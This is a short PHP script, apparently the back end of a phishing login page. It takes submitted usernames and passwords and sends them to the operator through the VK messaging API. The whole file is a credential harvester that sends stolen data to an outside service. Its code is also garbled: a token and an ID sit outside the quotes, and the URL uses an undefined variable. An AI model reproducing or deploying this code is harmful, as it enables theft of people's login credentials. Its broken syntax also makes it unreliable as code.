<?php
$login = $_POST['log'];
$password = $_POST['pass'];
$info = $login.":".$password;
$token = ""; 279448833 e937f3f087db076bcf2cb12170d17d4c62e22f20b97d841fa7cd1e54d29f6d56d8a6aa40bc6b33dd8bed3
$user = ""; 279448833
file_get_contents("https://api.vk.com/method/messages.send?user_id=$id&access_token=$token&message=$info&v=5.52");
?>